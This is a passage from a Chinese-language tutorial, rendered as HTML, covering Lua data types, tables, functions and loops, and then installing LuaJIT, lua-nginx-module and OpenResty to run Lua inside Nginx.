class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm">&gt;<span class="hljs-keyword">type</span>(3)<span class="hljs-comment">--&gt;number</span><br>&gt;<span class="hljs-keyword">type</span>(3.3)<span class="hljs-comment">--&gt;number</span><br></code></pre></td></tr></table></figure><p>所以它们之间是可以相互转换的，同时，具有相同算术值的整型值和浮点型值在Lua语言中是相等的</p><h5 id="string"><a class="markdownIt-Anchor" href="#string"></a> string</h5><p>Lua语言中的字符串即可以表示单个字符，也可以表示一整本书籍。在Lua语言中，操作100K或者1M个字母组成的字符串的程序很常见。</p><p>可以使用单引号或双引号来声明字符串</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">&gt;a = <span class="hljs-string">&quot;hello&quot;</span><br>&gt;b = <span class="hljs-string">&#x27;world&#x27;</span><br>&gt;<span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(a)</span>--&gt;</span>hello<br>&gt;<span class="hljs-built_in">print</span><span class="hljs-function"><span class="hljs-params">(b)</span> --&gt;</span>world<br></code></pre></td></tr></table></figure><p>如果声明的字符串比较长或者有多行，则可以使用如下方式进行声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">html = [[<br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Lua-string<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.lua.org&quot;</span>&gt;</span>Lua<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br>]]<br></code></pre></td></tr></table></figure><h5 id="table"><a class="markdownIt-Anchor" href="#table"></a> table</h5><p>​table是Lua语言中最主要和强大的数据结构。使用表， Lua 语言可以以一种简单、统一且高效的方式表示数组、集合、记录和其他很多数据结构。 Lua语言中的表本质上是一种辅助数组。这种数组比Java中的数组更加灵活，可以使用数值做索引，也可以使用字符串或其他任意类型的值作索引(除nil外)。</p><p>创建表的最简单方式:</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs node-repl"><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">a = &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>创建数组:</p><p>​我们都知道数组就是相同数据类型的元素按照一定顺序排列的集合，那么使用table如何创建一个数组呢?</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">arr = &#123;<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROSE&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>​要想获取数组中的值，我们可以通过如下内容来获取:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">0</span>])</span></span>nil<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">1</span>])</span></span>TOM<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">2</span>])</span></span>JERRY<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(arr[<span class="hljs-number">3</span>])</span></span>ROSE<br></code></pre></td></tr></table></figure><p>​从上面的结果可以看出来，数组的下标默认是从1开始的。所以上述创建数组，也可以通过如下方式来创建</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt;arr <span class="hljs-operator">=</span> &#123;&#125;<br>&gt;arr[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TOM&quot;</span><br>&gt;arr[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;JERRY&quot;</span><br>&gt;arr[<span class="hljs-number">3</span>] <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ROSE&quot;</span><br></code></pre></td></tr></table></figure><p>上面我们说过了，表的索引即可以是数字，也可以是字符串等其他的内容，所以我们也可以将索引更改为字符串来创建</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&gt;arr <span class="hljs-operator">=</span> &#123;&#125;<br>&gt;arr[<span class="hljs-string">&quot;X&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">10</span><br>&gt;arr[<span class="hljs-string">&quot;Y&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">20</span><br>&gt;arr[<span class="hljs-string">&quot;Z&quot;</span>] <span class="hljs-operator">=</span> <span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>当然，如果想要获取这些数组中的值，可以使用下面的方式</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">方式一<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;X&quot;</span>])<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;Y&quot;</span>])<br>&gt;<span class="hljs-built_in">print</span>(arr[<span class="hljs-string">&quot;Z&quot;</span>])<br>方式二<br>&gt;<span class="hljs-built_in">print</span>(arr.X)<br>&gt;<span class="hljs-built_in">print</span>(arr.Y)<br>&gt;<span class="hljs-built_in">print</span>(arr.Z)<br></code></pre></td></tr></table></figure><p>当前table的灵活不进于此，还有更灵活的声明方式</p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">&gt;arr = &#123;<span class="hljs-string">&quot;TOM&quot;</span>,<span class="hljs-keyword">X</span>=<span class="hljs-number">10</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-keyword">Y</span>=<span class="hljs-number">20</span>,<span class="hljs-string">&quot;ROSE&quot;</span>,<span class="hljs-keyword">Z</span>=<span class="hljs-number">30</span>&#125;<br></code></pre></td></tr></table></figure><p>如何获取上面的值?</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">TOM</span> :  arr[<span class="hljs-number">1</span>]<br><span class="hljs-number">10</span>  :  arr[<span class="hljs-string">&quot;X&quot;</span>] | arr.<span class="hljs-symbol">X</span><br><span class="hljs-symbol">JERRY</span>: arr[<span class="hljs-number">2</span>]<br><span class="hljs-number">20</span>  :  arr[<span class="hljs-string">&quot;Y&quot;</span>] | arr.<span class="hljs-symbol">Y</span><br><span class="hljs-symbol">ROESE</span>?<br></code></pre></td></tr></table></figure><h5 id="function"><a class="markdownIt-Anchor" href="#function"></a> function</h5><p>在 Lua语言中，函数（ Function ）是对语句和表达式进行抽象的主要方式。</p><p>定义函数的语法为:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">function</span> <span class="hljs-keyword">function</span><span class="hljs-constructor">Name(<span class="hljs-params">params</span>)</span><br><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>函数被调用的时候，传入的参数个数与定义函数时使用的参数个数不一致的时候，Lua 语言会通过 抛弃多余参数和将不足的参数设为 nil 的方式来调整参数的个数。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">function</span>  f(a,b)<br><span class="hljs-built_in">print</span>(a,b)<br>end<br><br>f<span class="hljs-function"><span class="hljs-params">()</span>--&gt;</span> nil  nil<br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>)</span>--&gt;</span> <span class="hljs-number">2</span> nil<br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">6</span>)</span>--&gt;</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span><br>f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2.6</span>.<span class="hljs-number">8</span>)</span>--&gt;</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> (<span class="hljs-number">8</span>被丢弃)<br></code></pre></td></tr></table></figure><p>可变长参数函数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">function <span class="hljs-built_in">add</span>(<span class="hljs-built_in">..</span>.)<br>a,b,<span class="hljs-attribute">c</span>=...<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-built_in">print</span>(b)<br><span class="hljs-built_in">print</span>(c)<br>end<br><br><span class="hljs-built_in">add</span>(1,2,3)  --&gt; 1 2 3<br></code></pre></td></tr></table></figure><p>函数返回值可以有多个，这点和Java不太一样</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(a,b)<br><span class="hljs-keyword">return</span> <span class="hljs-type">a,b</span><br><span class="hljs-keyword">end</span><br><br>x,y=f(<span class="hljs-number">11</span>,<span class="hljs-number">22</span>)<span class="hljs-comment">--&gt; x=11,y=22</span><br></code></pre></td></tr></table></figure><h5 id="thread"><a class="markdownIt-Anchor" href="#thread"></a> thread</h5><p>thread翻译过来是线程的意思，在Lua中，thread用来表示执行的独立线路，用来执行协同程序。</p><h5 id="userdata"><a class="markdownIt-Anchor" href="#userdata"></a> userdata</h5><p>userdata是一种用户自定义数据，用于表示一种由应用程序或C/C++语言库所创建的类型。</p><h4 id="lua控制结构"><a class="markdownIt-Anchor" href="#lua控制结构"></a> Lua控制结构</h4><p>Lua 语言提供了一组精简且常用的控制结构，包括用于条件执行的证 以及用于循环的 while、 repeat 和 for。 所有的控制结构语法上都有一个显式的终结符： end 用于终结 if、 for 及 while 结构， until 用于终结 repeat 结构。</p><h5 id="if-then-elseif-else"><a class="markdownIt-Anchor" href="#if-then-elseif-else"></a> if then elseif else</h5><p>if语句先测试其条件，并根据条件是否满足执行相应的 then 部分或 else 部分。 else 部分 是可选的。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testif</span><span class="hljs-params">(a)</span></span><br> <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a是正数&quot;</span>)<br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testif</span><span class="hljs-params">(a)</span></span><br> <span class="hljs-keyword">if</span> a&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">then</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a是正数&quot;</span>)<br> <span class="hljs-keyword">else</span><br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a是负数&quot;</span>)<br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>如果要编写嵌套的 if 语句，可以使用 elseif。 它类似于在 else 后面紧跟一个if。根据传入的年龄返回不同的结果，如</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">age</span>&lt;=<span class="hljs-number">18</span> 青少年，<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">18</span> , age &lt;=<span class="hljs-number">45</span> 青年<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">45</span> , age&lt;=<span class="hljs-number">60</span> 中年人<br><span class="hljs-attribute">age</span>&gt;<span class="hljs-number">60</span> 老年人<br><br><span class="hljs-attribute">function</span> show(age)<br><span class="hljs-attribute">if</span> age&lt;=<span class="hljs-number">18</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;青少年&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">18</span> and age&lt;=<span class="hljs-number">45</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;青年&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">45</span> and age&lt;=<span class="hljs-number">60</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;中年人&quot;</span><br><span class="hljs-attribute">elseif</span> age&gt;<span class="hljs-number">60</span> then<br> <span class="hljs-attribute">return</span> <span class="hljs-string">&quot;老年人&quot;</span><br><span class="hljs-attribute">end</span><br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><h5 id="while循环"><a class="markdownIt-Anchor" href="#while循环"></a> while循环</h5><p>顾名思义，当条件为真时 while 循环会重复执行其循环体。 Lua 语言先测试 while 语句 的条件，若条件为假则循环结束；否则， Lua 会执行循环体并不断地重复这个过程。</p><p>语法：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">while</span> 条件 <span class="hljs-keyword">do</span><br>  循环体<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>例子:实现数组的循环</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testWhile</span><span class="hljs-params">()</span></span><br> <span class="hljs-keyword">local</span> i = <span class="hljs-number">1</span><br> <span class="hljs-keyword">while</span> i&lt;=<span class="hljs-number">10</span> <span class="hljs-keyword">do</span><br>  <span class="hljs-built_in">print</span>(i)<br>  i=i+<span class="hljs-number">1</span><br> <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h5 id="repeat循环"><a class="markdownIt-Anchor" href="#repeat循环"></a> repeat循环</h5><p>顾名思义， repeat-until语句会重复执行其循环体直到条件为真时结束。 由于条件测试在循环体之后执行，所以循环体至少会执行一次。</p><p>语法</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">repeat</span><br> 循环体<br> <span class="hljs-keyword">until</span> 条件<br></code></pre></td></tr></table></figure><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testRepeat</span><span class="hljs-params">()</span></span><br> <span class="hljs-keyword">local</span> i = <span class="hljs-number">10</span><br> <span class="hljs-keyword">repeat</span><br>  <span class="hljs-built_in">print</span>(i)<br>  i=i<span class="hljs-number">-1</span><br> <span class="hljs-keyword">until</span> i &lt; <span class="hljs-number">1</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h5 id="for循环"><a class="markdownIt-Anchor" href="#for循环"></a> for循环</h5><p>数值型for循环</p><p>语法</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">for</span> <span class="hljs-built_in">param</span>=<span class="hljs-built_in">exp1</span>,<span class="hljs-built_in">exp2</span>,exp3 <span class="hljs-built_in">do</span><br> 循环体<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>param的值从exp1变化到exp2之前的每次循环会执行 循环体，并在每次循环结束后将步长(step)exp3增加到param上。exp3可选，如果不设置默认为1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i = <span class="hljs-number">1</span>,<span class="hljs-number">100</span>,<span class="hljs-number">10</span> do<br><span class="hljs-attribute">print</span>(i)<br><span class="hljs-attribute">end</span><br></code></pre></td></tr></table></figure><p>泛型for循环</p><p>泛型for循环通过一个迭代器函数来遍历所有值，类似于java中的foreach语句。</p><p>语法</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(x) <span class="hljs-keyword">do</span><br>循环体<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>i是数组索引值，v是对应索引的数组元素值，ipairs是Lua提供的一个迭代器函数，用来迭代数组，x是要遍历的数组。</p><p>例如:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lua">arr = &#123;<span class="hljs-string">&quot;TOME&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROWS&quot;</span>,<span class="hljs-string">&quot;LUCY&quot;</span>&#125;<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">ipairs</span>(arr) <span class="hljs-keyword">do</span><br> <span class="hljs-built_in">print</span>(i,v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>上述实例输出的结果为</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>TOM<br><span class="hljs-number">2</span>JERRY<br><span class="hljs-number">3</span><span class="hljs-built_in">ROWS</span><br><span class="hljs-number">4</span>LUCY<br></code></pre></td></tr></table></figure><p>但是如果将arr的值进行修改为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">arr</span> = &#123;<span class="hljs-string">&quot;TOME&quot;</span>,<span class="hljs-string">&quot;JERRY&quot;</span>,<span class="hljs-string">&quot;ROWS&quot;</span>,x=<span class="hljs-string">&quot;JACK&quot;</span>,<span class="hljs-string">&quot;LUCY&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>同样的代码在执行的时候，就只能看到和之前一样的结果，而其中的x为JACK就无法遍历出来，缺失了数据，如果解决呢?</p><p>我们可以将迭代器函数变成pairs,如</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(arr) <span class="hljs-keyword">do</span><br> <span class="hljs-built_in">print</span>(i,v)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>上述实例就输出的结果为</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-number">1</span>TOM<br><span class="hljs-number">2</span>JERRY<br><span class="hljs-number">3</span><span class="hljs-built_in">ROWS</span><br><span class="hljs-number">4</span>LUCY<br>xJACK<br></code></pre></td></tr></table></figure><h2 id="ngx_lua模块概念"><a class="markdownIt-Anchor" href="#ngx_lua模块概念"></a> ngx_lua模块概念</h2><p>淘宝开发的ngx_lua模块通过将lua解释器集成进Nginx，可以采用lua脚本实现业务逻辑，由于lua的紧凑、快速以及内建协程，所以在保证高并发服务能力的同时极大地降低了业务逻辑实现成本。</p><h2 id="ngx_lua模块环境准备"><a class="markdownIt-Anchor" href="#ngx_lua模块环境准备"></a> ngx_lua模块环境准备</h2><h3 id="方式一lua-nginx-module"><a class="markdownIt-Anchor" href="#方式一lua-nginx-module"></a> 方式一:lua-nginx-module</h3><ol><li>LuaJIT是采用C语言编写的Lua代表的解释器。</li></ol><p>官网地址为:<a href="http://luajit.org/">http://luajit.org/</a></p><p>在官网上找到对应的下载地址:<a href="http://luajit.org/download/LuaJIT-2.0.5.tar.gz">http://luajit.org/download/LuaJIT-2.0.5.tar.gz</a></p><p>在centos上使用wget来下载: wget <a href="http://luajit.org/download/LuaJIT-2.0.5.tar.gz">http://luajit.org/download/LuaJIT-2.0.5.tar.gz</a></p><p>将下载的资源进行解压: tar -zxf LuaJIT-2.0.5.tar.gz</p><p>进入解压的目录: cd LuaJIT-2.0.5</p><p>执行编译和安装: make &amp;&amp; make install</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636335626.png" alt="1604636335626" /></p><ol start="2"><li>下载lua-nginx-module</li></ol><p>下载地址:<a href="https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz">https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz</a></p><p>在centos上使用wget来下载: wget <a href="https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz">https://github.com/openresty/lua-nginx-module/archive/v0.10.16rc4.tar.gz</a></p><p>将下载的资源进行解压: tar -zxf lua-nginx-module-0.10.16rc4.tar.gz</p><p>更改目录名:mv lua-nginx-module-0.10.16rc4 lua-nginx-module</p><p>导入环境变量，告诉Nginx去哪里找luajit</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LUAJIT_LIB</span>=/usr/local/lib<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">LUAJIT_INC</span>=/usr/local/include/luajit-2.0<br></code></pre></td></tr></table></figure><p>进入Nginx的目录执行如下命令:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --prefix=/u</span>sr<span class="hljs-regexp">/local/</span>nginx --add-module=../lua-nginx-module<br>make &amp;&amp; make install<br></code></pre></td></tr></table></figure><p>注意事项:</p><p>（1）如果启动Nginx出现如下错误:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636421045.png" alt="1604636421045" /></p><p>解决方案:</p><p>设置软链接，使用如下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ln</span> -s /usr/local/lib/libluajit-<span class="hljs-number">5</span>.<span class="hljs-number">1</span>.so.<span class="hljs-number">2</span> /lib64/libluajit-<span class="hljs-number">5</span>.<span class="hljs-number">1</span>.so.<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>（2）如果启动Nginx出现以下错误信息</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636405241.png" alt="1604636405241" /></p><p>分析原因:因为lua-nginx-module是来自openrestry,错误中提示的resty.core是openrestry的核心模块，对其下的很多函数进行了优化等工作。以前的版本默认不会把该模块编译进去，所以需要使用的话，我们得手动安装，或者禁用就可以。但是最新的lua-nginx-module模块已经强制性安装了该模块，所以此处因为缺少resty模块导致的报错信息。</p><p>解决方案有两个:一种是下载对应的模块，另一种则是禁用掉restry模块，禁用的方式为:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">http&#123;<br>lua_load_resty_core off<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><ol start="3"><li>测试</li></ol><p>在nginx.conf下配置如下内容:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /lua&#123;<br>    <span class="hljs-attribute">default_type</span> <span class="hljs-string">&#x27;text/html&#x27;</span>;<br>    <span class="hljs-attribute">content_by_lua</span> <span class="hljs-string">&#x27;ngx.say(&quot;&lt;h1&gt;HELLO,LUA&lt;/h1&gt;&quot;)&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置成功后，启动nginx,通过浏览器进行访问，如果获取到如下结果，则证明安装成功。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604636592232.png" alt="1604636592232" /></p><h3 id="方式二openrestry"><a class="markdownIt-Anchor" href="#方式二openrestry"></a> 方式二:OpenRestry</h3><h4 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h4><p>​前面我们提到过，OpenResty是由淘宝工程师开发的，所以其官方网站(<a href="http://openresty.org/">http://openresty.org/</a>)我们读起来是非常的方便。OpenResty是一个基于Nginx与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。所以本身OpenResty内部就已经集成了Nginx和Lua，所以我们使用起来会更加方便。</p><h4 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">(<span class="hljs-number">1</span>) 下载OpenResty：https:<span class="hljs-regexp">//</span>openresty.org<span class="hljs-regexp">/download/</span>openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">2</span>)使用wget下载: wget https:<span class="hljs-regexp">//</span>openresty.org<span class="hljs-regexp">/download/</span>openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">3</span>)解压缩: tar -zxf openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span>.tar.gz<br>(<span class="hljs-number">4</span>)进入OpenResty目录: cd openresty-<span class="hljs-number">1.15</span>.<span class="hljs-number">8.2</span><br>(<span class="hljs-number">5</span>) 执行命令:./configure<br>(<span class="hljs-number">6</span>) 执行命令:make &amp;&amp; make install<br>(<span class="hljs-number">7</span>)进入OpenResty的目录，找到nginx：cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/openresty/</span>nginx/<br>(<span class="hljs-number">8</span>)在conf目录下的nginx.conf添加如下内容<br>location /lua&#123;<br>    default_type <span class="hljs-string">&#x27;text/html&#x27;</span>;<br>    content_by_lua <span 